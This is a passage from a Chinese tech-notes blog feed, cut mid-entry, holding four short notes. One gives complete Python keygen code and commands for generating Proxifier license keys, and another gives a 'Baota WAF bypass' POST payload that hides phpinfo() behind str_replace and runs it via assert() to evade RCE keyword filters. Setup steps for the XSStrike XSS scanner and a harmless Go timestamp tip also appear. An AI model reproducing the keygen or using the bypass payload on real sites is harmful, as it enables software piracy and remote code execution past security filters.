class="keyword">elif</span> s[i] == <span class="string">&#x27;X&#x27;</span>:</span><br><span class="line">            res += <span class="number">24</span></span><br><span class="line">        <span class="keyword">elif</span> s[i] == <span class="string">&#x27;Y&#x27;</span>:</span><br><span class="line">            res += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> s[i] == <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            res += <span class="number">18</span></span><br><span class="line">        <span class="keyword">elif</span> s[i] <span class="keyword">in</span> <span class="string">&quot;0123456789&quot;</span>:</span><br><span class="line">            res += t - <span class="number">48</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += t - <span class="number">55</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_re</span>(<span class="params">s, <span class="built_in">len</span></span>):</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        t = s % (<span class="number">2</span> ** <span class="number">5</span>)</span><br><span class="line">        s //= <span class="number">32</span></span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">            res += <span class="string">&#x27;W&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> t == <span class="number">24</span>:</span><br><span class="line">            res += <span class="string">&#x27;X&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> t == <span class="number">1</span>:</span><br><span class="line">            res += <span class="string">&#x27;Y&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> t == <span class="number">18</span>:</span><br><span class="line">            res += <span class="string">&#x27;Z&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt;= <span class="number">9</span>:</span><br><span class="line">            res += <span class="built_in">chr</span>(t + <span class="number">48</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += <span class="built_in">chr</span>(t + <span class="number">55</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRC32_like</span>(<span class="params">n</span>):</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        v2 = ((n &gt;&gt; (<span class="number">8</span> * i)) &amp; <span class="number">0xff</span>) &lt;&lt; <span class="number">24</span></span><br><span class="line">        <span class="keyword">if</span> i:</span><br><span class="line">            res ^= v2</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res = (~v2) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            res *= <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> res &gt;= <span class="number">0xffffffff</span>:</span><br><span class="line">                res &amp;= <span class="number">0xffffffff</span></span><br><span class="line">                res ^= <span class="number">0x4C11DB7</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">args</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.version <span class="keyword">or</span> args.version == <span class="string">&#x27;setup&#x27;</span>:  <span class="comment"># --version</span></span><br><span class="line">        product = <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> args.version == <span class="string">&#x27;portable&#x27;</span>:</span><br><span class="line">        product = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> args.version == <span class="string">&#x27;mac&#x27;</span>:</span><br><span class="line">        product = <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;版本参数错误!&quot;</span>)</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># if args.custom:               # --custom</span></span><br><span class="line">    <span class="comment">#     key_4th = args.custom</span></span><br><span class="line">    <span class="comment"># if args.table:                # --custom</span></span><br><span class="line">    <span class="comment">#     character_table = args.table</span></span><br><span class="line"></span><br><span class="line">    character_table = <span class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXZY&#x27;</span></span><br><span class="line">    random.seed(time())</span><br><span class="line">    key_4th = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        key_4th += character_table[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(character_table) - <span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 小于0x2580是过期的key, 高两字节是产品版本, 为0则是安装版, 1是便携版, 2是Mac版</span></span><br><span class="line">    low_4B = random.randint(<span class="number">0x2580</span>, <span class="number">0xFFFF</span>) + (product &lt;&lt; <span class="number">21</span>)</span><br><span class="line">    <span class="comment"># 高两字节是证书有效期, 为零直接无限期</span></span><br><span class="line">    mid_4B = random.randint(<span class="number">0</span>, <span class="number">0xFFFF</span>)</span><br><span class="line">    high_4B = handle(key_4th)</span><br><span class="line">    res = CRC32_like((high_4B &lt;&lt; <span class="number">64</span>) + (mid_4B &lt;&lt; <span class="number">32</span>) + low_4B)</span><br><span class="line">    v17 = res &amp; <span class="number">0x1FFFFFF</span></span><br><span class="line">    v18 = v17 ^ (v17 &lt;&lt; <span class="number">7</span>)</span><br><span class="line">    key_5th = handle_re(v17, <span class="number">5</span>)</span><br><span class="line">    key_0_7_ch = handle_re(low_4B ^ <span class="number">0x12345678</span> ^ v18, <span class="number">7</span>)</span><br><span class="line">    key_7_14_ch = handle_re(mid_4B ^ <span class="number">0x87654321</span> ^ v18, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 第三位不影响 key, 但是不能为&#x27;Y&#x27;, 否则版本对不上</span></span><br><span class="line">    key += key_0_7_ch[:<span class="number">2</span>] + character_table[random.randint(<span class="number">0</span>, <span class="number">34</span>)] + key_0_7_ch[<span class="number">3</span>:<span class="number">5</span>]</span><br><span class="line">    key += <span class="string">&#x27;-&#x27;</span></span><br><span class="line">    key += key_0_7_ch[<span class="number">5</span>:<span class="number">7</span>] + key_7_14_ch[:<span class="number">3</span>]</span><br><span class="line">    key += <span class="string">&#x27;-&#x27;</span></span><br><span class="line">    key += key_7_14_ch[<span class="number">3</span>:<span class="number">7</span>] + key_0_7_ch[<span class="number">2</span>]</span><br><span class="line">    key += <span class="string">&#x27;-&#x27;</span></span><br><span class="line">    key += key_4th</span><br><span class="line">    key += <span class="string">&#x27;-&#x27;</span></span><br><span class="line">    key += key_5th</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    args = get_parser()</span><br><span class="line">    <span class="built_in">print</span>(keygen(args))</span><br></pre></td></tr></table></figure></div><h2 id="Windows版"><a href="#Windows版" class="headerlink" title="Windows版"></a>Windows版</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.proxifier.com/download/ProxifierSetup.exe</span><br></pre></td></tr></table></figure></div><h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Proxifier_Keygen.py -v setup</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Proxifier_Keygen.py -v portable</span><br></pre></td></tr></table></figure></div><h2 id="MacOS版"><a href="#MacOS版" class="headerlink" title="MacOS版"></a>MacOS版</h2><h3 id="下载-1"><a href="#下载-1" class="headerlink" title="下载"></a>下载</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.proxifier.com/download/ProxifierMac.dmg</span><br></pre></td></tr></table></figure></div><h3 id="注册-1"><a href="#注册-1" class="headerlink" title="注册"></a>注册</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Proxifier_Keygen.py -v mac</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><ul><li>截图纪念</li></ul><p><img src="/images/20240709150209/01.webp"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;利用&lt;a href=&quot;/302.html?target=https://github.com/y9nhjy/Proxifier-Keygen&quot;&gt;y9nhjy&amp;#x2F;Proxifier-Keygen&lt;/a&gt;注册Proxifier学习笔记&lt;/p&gt;</summary>
    
    
    
    
    <category term="Github" scheme="https://loli.fj.cn/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】Go语言的时间戳转换为JS的时间戳</title>
    <link href="https://loli.fj.cn/2024/07/09/Go%E8%AF%AD%E8%A8%80%E7%9A%84%E6%97%B6%E9%97%B4%E6%88%B3%E8%BD%AC%E6%8D%A2%E4%B8%BAJS%E7%9A%84%E6%97%B6%E9%97%B4%E6%88%B3/"/>
    <id>https://loli.fj.cn/2024/07/09/Go%E8%AF%AD%E8%A8%80%E7%9A%84%E6%97%B6%E9%97%B4%E6%88%B3%E8%BD%AC%E6%8D%A2%E4%B8%BAJS%E7%9A%84%E6%97%B6%E9%97%B4%E6%88%B3/</id>
    <published>2024-07-09T10:05:16.000Z</published>
    <updated>2024-07-12T10:53:28.767Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Go语言默认只有以秒为单位的时间戳和以纳秒为单位的时间戳，而JS是以毫秒为单位的时间戳，所以需要转换一下</p><span id="more"></span><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><ul><li>先得到纳秒为单位的时间戳再<code>/ 1e6</code>转换为毫秒为单位的时间戳</li></ul><div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> timestamp = now.UnixNano() / <span class="number">1e6</span></span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="/302.html?target=https://blog.csdn.net/DisMisPres/article/details/98636716">CSDN——Grassto</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Go语言默认只有以秒为单位的时间戳和以纳秒为单位的时间戳，而JS是以毫秒为单位的时间戳，所以需要转换一下&lt;/p&gt;</summary>
    
    
    
    
    <category term="Javascript" scheme="https://loli.fj.cn/tags/Javascript/"/>
    
    <category term="Go" scheme="https://loli.fj.cn/tags/Go/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】XSStrike学习笔记</title>
    <link href="https://loli.fj.cn/2024/07/08/XSStrike%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://loli.fj.cn/2024/07/08/XSStrike%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2024-07-08T11:03:43.000Z</published>
    <updated>2024-07-12T10:53:28.831Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Advanced XSS Detection Suite（<a href="/302.html?target=https://github.com/s0md3v/XSStrike">Github</a>）</p><span id="more"></span><h2 id="下载项目"><a href="#下载项目" class="headerlink" title="下载项目"></a>下载项目</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/s0md3v/XSStrike.git</span><br><span class="line">cd XSStrike</span><br></pre></td></tr></table></figure></div><h2 id="下载依赖"><a href="#下载依赖" class="headerlink" title="下载依赖"></a>下载依赖</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m venv venv</span><br><span class="line">source venv/bin/activate</span><br><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure></div><h2 id="配置代理（可选）"><a href="#配置代理（可选）" class="headerlink" title="配置代理（可选）"></a>配置代理（可选）</h2><ul><li>修改<code>core/config.py</code>文件第9行</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><figcaption><span>core/config.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxies = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://0.0.0.0:8080&#x27;</span>, <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://0.0.0.0:8080&#x27;</span>&#125;</span><br></pre></td></tr></table></figure></div><h2 id="XSS检测"><a href="#XSS检测" class="headerlink" title="XSS检测"></a>XSS检测</h2><blockquote><p><code>--proxy</code>：使用代理</p></blockquote><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 xsstrike.py -u &lt;url&gt;</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Advanced XSS Detection Suite（&lt;a href=&quot;/302.html?target=https://github.com/s0md3v/XSStrike&quot;&gt;Github&lt;/a&gt;）&lt;/p&gt;</summary>
    
    
    
    
    <category term="Github" scheme="https://loli.fj.cn/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>【笔记】宝塔WAF绕过</title>
    <link href="https://loli.fj.cn/2024/07/08/%E5%AE%9D%E5%A1%94WAF%E7%BB%95%E8%BF%87/"/>
    <id>https://loli.fj.cn/2024/07/08/%E5%AE%9D%E5%A1%94WAF%E7%BB%95%E8%BF%87/</id>
    <published>2024-07-08T10:57:03.000Z</published>
    <updated>2024-07-12T10:53:28.847Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>宝塔WAF绕过</p><span id="more"></span><h2 id="RCE检测绕过"><a href="#RCE检测绕过" class="headerlink" title="RCE检测绕过"></a>RCE检测绕过</h2><ul><li>防止RCE中出现黑名单中的关键字</li></ul><div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><figcaption><span>request</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">x=$x=str_replace(&#x27;x&#x27;,&#x27;&#x27;,&#x27;pxhxpxixnxfxox(x)&#x27;);assert($x);</span><br></pre></td></tr></table></figure></div><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;宝塔WAF绕过&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
</feed>
